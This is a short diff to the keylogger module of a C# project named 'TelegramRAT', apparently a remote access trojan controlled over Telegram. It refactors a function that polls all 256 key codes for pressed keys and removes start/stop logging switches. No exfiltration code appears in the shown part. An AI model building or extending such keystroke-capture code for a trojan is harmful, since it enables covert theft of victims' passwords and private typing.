@@ -1,14 +1,12 @@
-﻿using TelegramRAT.Utilities;
+using TelegramRAT.Utilities;
 
 namespace TelegramRAT.Features;
 
 static class Keylogger
 {
-    public static bool IsLogging { get; private set; } = false;
-
-    public static List<uint> GetPressingKeys()
+    public static void GetPressingKeys(List<uint> keys)
     {
-        List<uint> keys = new List<uint>();
+        keys.Clear();
 
         for (uint i = 0; i < 256; i++)
         {
@@ -18,22 +16,6 @@ static class Keylogger
                 keys.Add(i);
             }
         }
-
-        return keys;
-    }
-
-    public static void StartLogging()
-    {
-        if (IsLogging)
-            throw new Exception("Keylogger was already started!");
-        IsLogging = true;
-    }
-
-    public static void StopLogging()
-    {
-        if (!IsLogging)
-            throw new Exception("Keylogger wasn't started yet!");
-        IsLogging = false;
     }
 
     enum VirtualKeyCodesTable
